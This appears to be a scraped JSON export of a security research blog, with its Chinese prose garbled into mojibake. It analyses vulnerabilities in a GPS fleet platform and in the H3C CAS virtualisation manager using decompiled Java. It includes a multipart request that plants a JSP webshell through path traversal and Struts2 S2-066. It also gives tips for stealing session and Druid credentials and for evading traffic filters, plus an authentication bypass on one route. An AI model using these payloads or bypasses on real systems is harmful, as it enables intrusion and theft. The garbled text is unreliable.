JasperReport getJasperReportFromFile(String reportKey) throws IOException, JRException &#123; String filePath = this.jasperReportPath + &quot;\\\\&quot; + reportKey + &quot;.jasper&quot;; File reportFile = null; JasperReport jasperReport = null; reportFile = new File(filePath); if (reportFile.exists() &amp;&amp; reportFile.isFile()) &#123; jasperReport = (JasperReport)JRLoader.loadObject(reportFile); &#125; return jasperReport;&#125;// net.sf.jasperreports.engine.util.JRLoaderpublic static Object loadObject(File file) throws JRException &#123; return loadObject(DefaultJasperReportsContext.getInstance(), (File)file);&#125;public static Object loadObject(JasperReportsContext jasperReportsContext, File file) throws JRException &#123; if (file.exists() &amp;&amp; file.isFile()) &#123; Object obj = null; FileInputStream fis = null; ObjectInputStream ois = null; try &#123; fis = new FileInputStream(file); BufferedInputStream bufferedIn = new BufferedInputStream(fis); ois = new ContextClassLoaderObjectInputStream(jasperReportsContext, bufferedIn); obj = ois.readObject(); &#125; catch (IOException var17) &#123; throw new JRException(&quot;util.loader.object.from.file.loading.error&quot;, new Object[]&#123;file&#125;, var17); &#125; catch (ClassNotFoundException var18) &#123; throw new JRException(&quot;util.loader.class.not.found.from.file&quot;, new Object[]&#123;file&#125;, var18); &#125; finally &#123; if (ois != null) &#123; try &#123; ois.close(); &#125; catch (IOException var16) &#123; &#125; &#125; if (fis != null) &#123; try &#123; fis.close(); &#125; catch (IOException var15) &#123; &#125; &#125; &#125; return obj; &#125; else &#123; throw new JRException(new FileNotFoundException(String.valueOf(file))); &#125;&#125; ä»ä»¥ä¸‹è°ƒç”¨é“¾ä¸éš¾å‘ç°æœ€ç»ˆä¼šé€šè¿‡æ–‡ä»¶å†…å®¹è§¦å‘ååºåˆ—åŒ–æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨è¿™è¿‡ç¨‹ä¸­æ–‡ä»¶åæœªåšæ ¡éªŒå¯ä»¥ç©¿è¶Šåˆ°FTPæœåŠ¡ç›®å½•ä¸‹ com.framework.jasperReports.ReportCreater#_createReport=&gt;com.framework.jasperReports.ReportCreater#getJasperReport=&gt;com.framework.jasperReports.ReportCreater#getJasperReportFromFile=&gt;net.sf.jasperreports.engine.util.JRLoader#loadObject=&gt;net.sf.jasperreports.engine.util.ContextClassLoaderObjectInputStream#readObject å› æ­¤æœ€ç»ˆæ¼æ´çš„å®Œæ•´åˆ©ç”¨å°±å‡ºæ¥äº† å°è¯•çªç ´æ–‡ä»¶ä¸Šä¼ é™åˆ¶ä½†æˆ‘ä»¬ä¹ŸçŸ¥é“å¦‚æœä»…ä»…æ˜¯ä¾èµ–ftpé»˜è®¤ç”¨æˆ·åå®ç°æ–‡ä»¶ä¸Šä¼ çš„è¯é‚£å¯å°±å¤ªéš¾äº†ï¼Œåœ¨å¼€å§‹å‰ç®€å•èŠä¸€ä¸‹struts2çš„é…ç½® åœ¨é…ç½®ä¸­å†™åˆ°äº†actionçš„è®¿é—®æ–¹å¼ï¼Œä½†æˆ‘ä»¬çš„è·¯ç”±è®¿é—®å¹¶æœªå‡ºç°å…¨ç±»åï¼Œé‚£å®ƒæ˜¯æ€ä¹ˆæ‰¾åˆ°å…·ä½“çš„ç±»çš„å‘¢ï¼Ÿ 1&lt;action name=&quot;*_*.action&quot; class=&quot;&#123;1&#125;&quot; method=&quot;&#123;2&#125;&quot;&gt; ç»è¿‡æŸ¥æ‰¾ï¼Œå¯ä»¥åœ¨applicationContext-xxxx.xmlä¸­å®šä¹‰çš„beanä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨bean-nameå¾—åˆ°è¿™ä¸ªç±» 12&lt;bean name=&quot;StandardApiAction&quot; class=&quot;com.gps808.api.action.StandardApiAction&quot; scope=&quot;prototype&quot; parent=&quot;standardUserBaseAction&quot;&gt;xxxxxx è€Œå¦‚æœè¿™ä¸ªç±»æœªåœ¨xmlä¸­å®šä¹‰æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨å…¨ç±»åæ¥æ ‡è¯†è¿™ä¸ªç±»ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥å°†ç›®æ ‡é”å®šåˆ°com.framework.web.action.FileUploadAction#uploadä¸­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.framework.web.action;import java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.util.List;public class FileUploadAction extends BaseAction &#123; private static final long serialVersionUID = 1L; private String describe; private List&lt;File&gt; uploadFile; private List&lt;String&gt; uploadFileFileName; private List&lt;String&gt; uploadFileContentType; public FileUploadAction() &#123; &#125; public boolean hasOperatorPrivi() &#123; return true; &#125; public void upload() &#123; for(int i = 0; i &lt; this.uploadFileFileName.size(); ++i) &#123; BufferedInputStream bis = null; BufferedOutputStream bos = null; String fileName = (String)this.uploadFileFileName.get(i); try &#123; if (!&quot;&quot;.equals(fileName)) &#123; FileInputStream fis = new FileInputStream((File)this.uploadFile.get(i)); FileOutputStream fos = new FileOutputStream(&quot;C:\\\\&quot; + fileName); bis = new BufferedInputStream(fis); bos = new BufferedOutputStream(fos); byte[] b = new byte[1024]; int len = true; int len; while((len = bis.read(b)) != -1) &#123; bos.write(b, 0, len); &#125; &#125; &#125; catch (Exception var17) &#123; &#125; finally &#123; try &#123; if (bis != null) &#123; bis.close(); &#125; if (bos != null) &#123; bos.close(); &#125; &#125; catch (IOException var16) &#123; &#125; &#125; &#125; &#125; public String image() throws Exception &#123; try &#123; this.upload(); &#125; catch (Exception var2) &#123; this.log.error(var2.getMessage(), var2); this.addCustomResponse(ACTION_RESULT, 1); &#125; return &quot;success&quot;; &#125; public String getDescribe() &#123; return this.describe; &#125; public void setDescribe(String describe) &#123; this.describe = describe; &#125; public List&lt;File&gt; getUploadFile() &#123; return this.uploadFile; &#125; public void setUploadFile(List&lt;File&gt; uploadFile) &#123; this.uploadFile = uploadFile; &#125; public List&lt;String&gt; getUploadFileFileName() &#123; return this.uploadFileFileName; &#125; public void setUploadFileFileName(List&lt;String&gt; uploadFileFileName) &#123; this.uploadFileFileName = uploadFileFileName; &#125; public List&lt;String&gt; getUploadFileContentType() &#123; return this.uploadFileContentType; &#125; public void setUploadFileContentType(List&lt;String&gt; uploadFileContentType) &#123; this.uploadFileContentType = uploadFileContentType; &#125;&#125; å¯ä»¥åœ¨ä»£ç ä¸­çœ‹åˆ°ç›´æ¥çš„è·¯å¾„æ‹¼æ¥ï¼ŒFileOutputStream fos = new FileOutputStream(&quot;C:\\\\&quot; + fileName);ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥ä¸Šä¼ jasperæ–‡ä»¶å¹¶è§¦å‘ååºåˆ—åŒ–äº† å¦ä¸€æ–¹é¢æ—¢ç„¶å¯ä»¥ä»»æ„å†™å…¥ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°åœ¨å­ç›®å½•ä¸‹å†™å…¥webshellæ–‡ä»¶ï¼Œä½†ç”±äºæ˜¯struts2çš„ä¸Šä¼ å¤„ç†ï¼Œåœ¨org.apache.struts2.interceptor.FileUploadInterceptorä¸­ï¼Œåœ¨è¿™ä¸ªæ‹¦æˆªå™¨æœ€ç»ˆè·å–æ–‡ä»¶åæ—¶ï¼Œä¼šå¤„ç†å¸¦\\ä»¥åŠ/çš„æ–‡ä»¶å 12345678910111213protected String getCanonicalName(final String originalFileName) &#123; String fileName = originalFileName; int forwardSlash = fileName.lastIndexOf(&#x27;/&#x27;); int backwardSlash = fileName.lastIndexOf(&#x27;\\\\&#x27;); if (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) &#123; fileName = fileName.substring(forwardSlash + 1); &#125; else &#123; fileName = fileName.substring(backwardSlash + 1); &#125; return fileName; &#125; è¿™æ—¶å€™æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“struts2åœ¨23å¹´å¹´åº•å‡ºäº†ä¸€ä¸ªæ–°æ¼æ´ï¼Œè¿™æ—¶å€™ä¾¿å¯ä»¥æ’å‡ºç”¨åœºäº†ï¼Œå¿˜äº†çš„å¯ä»¥å›é¡¾æˆ‘ä¹‹å‰çš„æ–‡ç« ï¼ŒApache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066) å› æ­¤æˆ‘ä»¬ä¾¿èƒ½å¤Ÿæ„é€ ï¼Œè¾¾åˆ°å‰å°RCEçš„æ•ˆæœ 1234567891011--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfvContent-Disposition: form-data; name=&quot;UploadFile&quot;;filename=&quot;z12.jsp&quot;;Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document&lt;%out.print(&quot;Hacked By Y4tacker&quot;);%&gt;--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfvContent-Disposition: form-data; name=&quot;uploadFileFileName&quot;;Program Files\\CMSServerV6\\tomcat\\webapps\\gpsweb\\1.jsp--------------------------HaQDiSzdPIerngHCcHgQNrLjEmThVzfuEVDTUvfv-- ä½†å¾ˆå¯æƒœæ–°ç‰ˆæœ¬ä¸­struts2çš„ä¾èµ–æ›´æ–°åˆ°äº†2.5.33çš„å®‰å…¨ç‰ˆæœ¬ï¼Œå¹¶ä¸”å°†com.framework.web.action.FileUploadAction#uploadå¼ºè¡Œè®¾ç½®äº†è·¯å¾„404å¹¶ç§»é™¤äº†ä¸Šä¼ å¤„ç†é€»è¾‘ï¼Œå› æ­¤åœ¨æ–°ç‰ˆæœ¬ä¸­ä¹Ÿä¾¿å¤±æ•ˆäº† ç»“åˆS2çš„æ¼æ´æ—¶é—´å¯ä»¥å¤§èƒ†çŒœæµ‹ä¹Ÿè®¸æ˜¯åœ¨å¹´åº•å‰åˆ é™¤çš„ï¼Ÿå½“ç„¶ç”±äºæˆ‘æ²¡æœ‰ä»£ç æ‰€ä»¥æ— å¤„éªŒè¯äº†ï¼Œåœ¨å®æˆ˜ç¯å¢ƒä¸­å¯ä»¥å¤šåšå°è¯• å¯¹æŠ—æµé‡è®¾å¤‡çš„ä¸€äº›å°è¯• ä¸ä»…ä»…å¯ä»¥è¯»å–log_info.logè·å–ç”¨æˆ·sessionï¼Œè¿˜å¯ä»¥å°è¯•è¯»å–web.xmlæ–‡ä»¶ï¼Œåœ¨å½“ä¸­é…ç½®äº†Druidç›‘æ§çš„ç”¨æˆ·åä»¥åŠå¯†ç ï¼Œåœ¨è€ç‰ˆæœ¬ä¸­è¿™ä¸ªé…ç½®é»˜è®¤å¯ç”¨ï¼Œæ–°ç‰ˆæœ¬ä¸­druidç›‘æ§æˆä¸ºäº†å¯é€‰é¡¹ï¼Œä½†ä¸å¤±ä¸ºä¸€ç§æ¼æ´åˆ©ç”¨çš„å°è¯• ä½¿ç”¨å…¨ç±»åæ›¿ä»£beançš„è·å–å½¢å¼ï¼Œå‡å¦‚æµé‡è®¾å¤‡æ‹¦æˆªè·¯ç”±ä¸º/StandardABCAction_downLoadï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä½¿ç”¨/com.xxx.xxxxAction_downLoadçš„å½¢å¼å°è¯•ç»•è¿‡ æˆ‘ä»¬ä¸ä»…å¯ä»¥ä½¿ç”¨å®˜æ–¹å…¬å‘Šä¸­ä½¿ç”¨çš„StandardSchoolBusActionè·¯ç”±ï¼Œç»è¿‡åˆ†æå‡¡æ˜¯ç»§æ‰¿äº†com.gpsCommon.action.CommonBaseActionçš„ç±»å‡èƒ½ä½¿ç”¨","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"é€šå¤©æ˜Ÿ","slug":"é€šå¤©æ˜Ÿ","permalink":"https://y4tacker.github.io/tags/%E9%80%9A%E5%A4%A9%E6%98%9F/"}]},{"title":"æµ…æH3C-CASè™šæ‹ŸåŒ–ç®¡ç†ç³»ç»Ÿæƒé™ç»•è¿‡è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"year/2024/5/æµ…æH3C-CASè™šæ‹ŸåŒ–ç®¡ç†ç³»ç»Ÿæƒé™ç»•è¿‡è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2024-05-11T09:03:43.000Z","updated":"2024-05-14T01:32:56.000Z","comments":true,"path":"2024/05/11/year/2024/5/æµ…æH3C-CASè™šæ‹ŸåŒ–ç®¡ç†ç³»ç»Ÿæƒé™ç»•è¿‡è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´/","link":"","permalink":"https://y4tacker.github.io/2024/05/11/year/2024/5/%E6%B5%85%E6%9E%90H3C-CAS%E8%99%9A%E6%8B%9F%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"æµ…æH3C-CASè™šæ‹ŸåŒ–ç®¡ç†ç³»ç»Ÿæƒé™ç»•è¿‡è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´å†™åœ¨å‰é¢ä¹‹å‰å››æœˆå°±å…³æ³¨åˆ°äº†ï¼Œå¯æ˜¯åé¢ä¸çŸ¥é“ä»€ä¹ˆåŸå› æŸæ­¥ä¸‹äº†å…¬ä¼—å·ï¼Œä»Šå¤©åˆè¢«å†æ¬¡æèµ·ï¼Œå½“æ—¶åˆ†æäº†ä¸€åŠä¹Ÿå°±æ˜¯æƒé™ç›¸å…³çš„è°ƒç”¨ï¼Œç°åœ¨è¡¥ä¸Šå¦ä¸€åŠ æ­£æ–‡é‰´æƒç›¸å…³é…ç½®ç®€ææ—¢ç„¶å’Œæƒé™ç»•è¿‡ç›¸å…³é‚£ä¹ˆç¬¬ä¸€æ­¥æˆ‘ä»¬å¿…ç„¶è¦å»å…ˆçœ‹çœ‹ç›¸å…³é…ç½®ï¼Œåœ¨web.xmlé…ç½®æ–‡ä»¶å½“ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³çš„å¦‚ä¸‹é…ç½® è¿™é‡Œæˆ‘ä»¬åªè¦å…³æ³¨ä¸¤ç‚¹ï¼Œç¬¬ä¸€serveletéœ€è¦ä»¥/carsrså¼€å¤´ï¼Œç¬¬äºŒé…ç½®æ–‡ä»¶åœ¨/com/virtual/plat/config/beans-*.xmlä¸‹ 12345678910111213141516171819202122232425&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath*:/com/virtual/plat/config/beans-*.xml &lt;/param-value&gt;&lt;/context-param&gt;xxxxxxçœç•¥xxxxxx&lt;servlet-mapping&gt; &lt;servlet-name&gt;Jersey Spring Web Application&lt;/servlet-name&gt; &lt;url-pattern&gt;/casrs/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:/com/virtual/plat/config/dispatcher-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;dispatchOptionsRequest&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/servlet&gt; å…³è”å¯¹åº”é…ç½®ï¼Œè¿™é‡Œç”±äºè·¯ç”±å‰ç¼€å›ºå®šï¼Œæƒ³å°è¯•é€šè¿‡é™æ€æ–‡ä»¶å»ç»•è¿‡é‰´æƒé™åˆ¶çš„è€æ€è·¯å¯ä»¥å…ˆæš‚æ—¶æ”¾å¼ƒï¼Œåœ¨è¿™é‡Œå¯ä»¥é‡ç‚¹å…³æ³¨é‰´æƒå¯¹åº”å¤„ç†çš„digestFilterå¯¹åº”çš„ç±» 1234567891011121314151617181920xxxxxxçœç•¥xxxxxx(åˆ—ä¸¾éƒ¨åˆ†)&lt;http pattern=&quot;/html/help/**&quot; security=&quot;none&quot;/&gt;&lt;http pattern=&quot;/js/lib/jquery-1.9.1.min.js&quot; security=&quot;none&quot;/&gt;&lt;http pattern=&quot;/warnManage/add&quot; security=&quot;none&quot;/&gt;xxxxxxçœç•¥xxxxxx&lt;http pattern=&quot;/casrs/**&quot; entry-point-ref=&quot;digestEntryPoint&quot;&gt; &lt;intercept-url pattern=&quot;/**&quot; access=&quot;hasRole(&#x27;ROLE_RSCLIENT&#x27;)&quot; requires-channel=&quot;any&quot;/&gt; &lt;custom-filter ref=&quot;digestFilter&quot; position=&quot;BASIC_AUTH_FILTER&quot;/&gt; &lt;csrf disabled=&quot;true&quot;/&gt;&lt;/http&gt;&lt;!-- restæ¥å£ä½¿ç”¨ --&gt;&lt;beans:bean id=&quot;digestFilter&quot; class=&quot;com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilter&quot;&gt; &lt;beans:property name=&quot;userDetailsService&quot; ref=&quot;casUserDetailsService&quot; /&gt; &lt;beans:property name=&quot;authenticationEntryPoint&quot; ref=&quot;digestEntryPoint&quot; /&gt; &lt;beans:property name=&quot;userCache&quot; ref=&quot;casAuthUserCache&quot; /&gt;&lt;/beans:bean&gt; â€œé˜‰å‰²â€çš„é‰´æƒè·¯ç”±æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æˆ‘ä»¬å°±å…·ä½“çœ‹çœ‹com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilteråšäº†ä»€ä¹ˆå¤„ç† ä»ä»£ç ä¸­ä¸éš¾çœ‹å‡ºï¼Œå¦‚æœPathä¸º/vm/backUpFromCasserverï¼Œé‚£ä¹ˆå˜é‡var4åˆ™ä¼šè¢«è®¾ç½®ä¸ºtrue 123456789101112131415161718192021222324public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException &#123; GenericHttpRequest var6 = new GenericHttpRequest((HttpServletRequest)var1); if (this.a(var6, var2)) &#123; boolean var4 = false; String var5 = ((HttpServletRequest)var6).getPathInfo(); if (&quot;/vm/backUpFromCasserver&quot;.equals(var5)) &#123; var4 = true; &#125; super.doFilter(var6, var2, var3, var4); if (SecurityContextHolder.getContext().getAuthentication() == null) &#123; HttpServletRequest var7; String var8; if ((var8 = (var7 = (HttpServletRequest)var6).getHeader(&quot;Authorization&quot;)) != null &amp;&amp; var8.startsWith(&quot;Digest &quot;)) &#123; this.a(var6); &#125; return; &#125; this.b(var6); &#125;&#125; ç»§ç»­è·Ÿè¿›super.doFilterçš„è°ƒç”¨ï¼Œå…¶çˆ¶ç±»çš„è°ƒç”¨ä¸ºcom.virtual.plat.server.rs.ext.event.DigestAuthenticationFilterExt#doFilter åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨var4è¿™ä¸ªå‚æ•°çš„ä¼ é€’è¿‡ç¨‹ï¼Œå®ƒå‡ºç°åœ¨ä¸¤ä¸ªéƒ¨åˆ†ï¼š this.a(var6, var7, var5, var4)) (var8 = new LoginParameter()).setIgnorePw(var4); 123456789101112131415161718public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3, boolean var4) throws IOException, ServletException &#123; HttpServletRequest var6 = (HttpServletRequest)var1; HttpServletResponse var7 = (HttpServletResponse)var2; String var5; if ((var5 = var6.getHeader(&quot;Authorization&quot;)) == null || !var5.startsWith(&quot;Digest &quot;) || this.a(var6, var7, var5, var4)) &#123; if (var5 == null || !var5.startsWith(&quot;LDAP &quot;) || this.b(var6, var7, var5)) &#123; LoginParameter var8; if ((var8 = LocalParameter.get()) == null) &#123; (var8 = new LoginParameter()).setIgnorePw(var4); LocalParameter.put(var8); &#125; else &#123; var8.setIgnorePw(var4); &#125; var3.doFilter(var6, var7); &#125; &#125;&#125; ç”±äºåè€…åå­—æ²¡æœ‰æ··æ·†æ›´ç›´è§‚ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©ä¼˜å…ˆæŸ¥çœ‹å…¶å¦‚ä½•è¢«è°ƒç”¨ï¼Œä»è‹±æ–‡åæ¥çœ‹ï¼Œä¼¼ä¹å­—é¢æ„æ€æ˜¯è®¾ç½®äº†å¿½ç•¥å¯†ç çš„å±æ€§ ç”±äºæˆ‘åªæœ‰ä»£ç æ²¡æœ‰ç¯å¢ƒæƒ³åœ¨ç¯å¢ƒä¸­åŠ¨æ€è°ƒè¯•éªŒè¯æ˜æ˜¾ä¸å¤ªå¯èƒ½ï¼Œæ¢ä¸ªæ–¹å‘æ€è€ƒï¼Œæœ‰è®¾ç½®å¿…ç„¶æœ‰è·å– ä»ç±»LoginParameterçš„æ–¹æ³•å½“ä¸­æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåœ¨è·å–å¹¶åˆ¤æ–­æ—¶ä½¿ç”¨äº†æ–¹æ³•isIgnorePw 1234567891011121314public class LoginParameter &#123; private boolean a; public LoginParameter() &#123; &#125; public boolean isIgnorePw() &#123; return this.a; &#125; public void setIgnorePw(boolean var1) &#123; this.a = var1; &#125;&#125; åœ¨ä¸èƒ½è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªèƒ½å°è¯•å»æœç´¢çœ‹çœ‹ï¼Œé€šè¿‡è®¸å°‘å†™çš„jar analyzerå¾ˆå¿«ä¾¿å®šä½åˆ°äº†å…¶è°ƒç”¨ä½ç½®ï¼Œä»ä»¥ä¸‹å‡½æ•°é€»è¾‘æ¥çœ‹ï¼Œæ˜¾ç„¶å‡½æ•°é€»è¾‘åªæ˜¯å’Œå¯†ç æœ‰æ•ˆæœŸç›¸å…³ å› æ­¤ï¼Œæˆ‘ä»¬åªå‰©ä¸‹this.a(var6, var7, var5, var4)å¯ä»¥å…³æ³¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556private boolean a(HttpServletRequest var1, HttpServletResponse var2, String var3, boolean var4) throws IOException, ServletException &#123; if (AuthorCenterService.isAuthorCenter()) &#123; Map var15; if ((var15 = a(a(var3.substring(7), &#x27;,&#x27;), &quot;=&quot;, &quot;\\&quot;&quot;)) == null) &#123; a.error(&quot;handleAuthAC Error: headerMap is null.&quot;); return false; &#125; else &#123; String var5 = (String)var15.get(&quot;username&quot;); String var6 = (String)var15.get(&quot;realm&quot;); String var7 = (String)var15.get(&quot;nonce&quot;); String var8 = (String)var15.get(&quot;uri&quot;); String var9 = (String)var15.get(&quot;response&quot;); String var10 = (String)var15.get(&quot;qop&quot;); String var11 = (String)var15.get(&quot;nc&quot;); String var16 = (String)var15.get(&quot;cnonce&quot;); DigestInfo var12; (var12 = new DigestInfo()).setEntryPoint(this.getAuthenticationEntryPoint()); var12.setUsername(var5); var12.setRealm(var6); var12.setNonce(var7); var12.setUri(var8); var12.setResponseDigest(var9); var12.setQop(var10); var12.setNc(var11); var12.setCnonce(var16); var12.setRequestMethod(var1.getMethod()); var16 = AuthorCenterService.getInstance().digestAuth(var12); if (var16 != null) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(var16))); return false; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Authentication success for user: &#x27;&quot; + var5 + &quot;&#x27; with response: &#x27;&quot; + var9 + &quot;&#x27;&quot;); &#125; UserDetails var13 = this.f.loadUserByUsername(var5); UsernamePasswordAuthenticationToken var14; if (this.h) &#123; var14 = new UsernamePasswordAuthenticationToken(var13, var13.getPassword(), var13.getAuthorities()); &#125; else &#123; var14 = new UsernamePasswordAuthenticationToken(var13, var13.getPassword()); &#125; var14.setDetails(this.c.buildDetails(var1)); SecurityContextHolder.getContext().setAuthentication(var14); if (var1.getSession() != null) &#123; var1.getSession().setAttribute(&quot;loginName&quot;, var5); &#125; return true; &#125; &#125; &#125; else &#123; return this.b(var1, var2, var3, var4); &#125;&#125; ç”±äºæ²¡æœ‰å…·ä½“ä»£ç ï¼Œä»AuthorCenterService.isAuthorCenter()é€»è¾‘å¯ä»¥çœ‹å‡ºï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯æ²¡æœ‰è®¤è¯ä¸­å¿ƒçš„ï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°è®¤è¯ 123456789101112131415public static boolean isAuthorCenter() &#123; return gInstance == null ? false : gInstance.useAuthorCenter();&#125;public boolean useAuthorCenter() &#123; return &quot;authorCenter&quot;.equals(this.authorizeType);&#125;@Servicepublic class AuthorCenterService &#123; private static Log log = LogFactory.getLog(AuthorCenterService.class); @Resource private OperatorMgr operatorMgr = null; String authorizeType = &quot;local&quot;; å› æ­¤è‡ªç„¶è€Œç„¶å‡½æ•°çš„è°ƒç”¨æµå‘äº†com.virtual.plat.server.rs.ext.event.DigestAuthenticationFilterExt#b(HttpServletRequest, HttpServletResponse, java.lang.String, boolean)ï¼Œåœ¨è¿™ä¸ªè®¤è¯ä¸­æˆ‘ä»¬ä¸»è¦çœ‹if (!var14.equals(var10) &amp;&amp; !var4) &#123;ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯æ¯”å¯¹responseæ‘˜è¦ä¿¡æ¯æ˜¯å¦ä¸€è‡´ï¼Œè€Œç”±äºvar4ä¸ºtrueï¼Œå› æ­¤å¯†ç æ˜¯å¦æ­£ç¡®éƒ½ä¸ä¼šå½±å“ç¨‹åºçš„æ‰§è¡Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121private boolean b(HttpServletRequest var1, HttpServletResponse var2, String var3, boolean var4) throws IOException, ServletException &#123;Map var5;String var6 = (String)(var5 = a(a(var3 = var3.substring(7), &#x27;,&#x27;), &quot;=&quot;, &quot;\\&quot;&quot;)).get(&quot;username&quot;);String var7 = (String)var5.get(&quot;realm&quot;);String var8 = (String)var5.get(&quot;nonce&quot;);String var9 = (String)var5.get(&quot;uri&quot;);String var10 = (String)var5.get(&quot;response&quot;);String var11 = (String)var5.get(&quot;qop&quot;);String var12 = (String)var5.get(&quot;nc&quot;);String var25 = (String)var5.get(&quot;cnonce&quot;);if (var6 != null &amp;&amp; var7 != null &amp;&amp; var8 != null &amp;&amp; var9 != null &amp;&amp; var2 != null) &#123; if (!&quot;auth&quot;.equals(var11) || var12 != null &amp;&amp; var25 != null) &#123; if (!var7.equals(this.getAuthenticationEntryPoint().getRealmName())) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.incorrectRealm&quot;, new Object[]&#123;var7, this.getAuthenticationEntryPoint().getRealmName()&#125;, &quot;Response realm name &#x27;&#123;0&#125;&#x27; does not match system realm name of &#x27;&#123;1&#125;&#x27;&quot;)))); return false; &#125; else if (!Base64.isBase64(var8.getBytes())) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceEncoding&quot;, new Object[]&#123;var8&#125;, &quot;Nonce is not encoded in Base64; received nonce &#123;0&#125;&quot;)))); return false; &#125; else &#123; String[] var13; if ((var13 = StringUtils.delimitedListToStringArray(var3 = new String(Base64.decode(var8.getBytes())), &quot;:&quot;)).length != 2) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceNotTwoTokens&quot;, new Object[]&#123;var3&#125;, &quot;Nonce should have yielded two tokens but was &#123;0&#125;&quot;)))); return false; &#125; else &#123; long var18; try &#123; var18 = new Long(var13[0]); &#125; catch (NumberFormatException var22) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceNotNumeric&quot;, new Object[]&#123;var3&#125;, &quot;Nonce token should have yielded a numeric first token, but was &#123;0&#125;&quot;)))); return false; &#125; if (!a(var18 + &quot;:&quot; + this.getAuthenticationEntryPoint().getKey()).equals(var13[1])) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceCompromised&quot;, new Object[]&#123;var3&#125;, &quot;Nonce token compromised &#123;0&#125;&quot;)))); return false; &#125; else &#123; boolean var24 = false; UserDetails var26; if ((var26 = this.e.getUserFromCache(var6)) == null) &#123; var24 = true; try &#123; var26 = this.f.loadUserByUsername(var6); &#125; catch (UsernameNotFoundException var21) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.usernameNotFound&quot;, new Object[]&#123;var6&#125;, &quot;Username &#123;0&#125; not found&quot;)))); return false; &#125; if (var26 == null) &#123; throw new AuthenticationServiceException(&quot;AuthenticationDao returned null, which is an interface contract violation&quot;); &#125; this.e.putUserInCache(var26); &#125; String var14; if (!(var14 = a(this.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25)).equals(var10) &amp;&amp; !var24 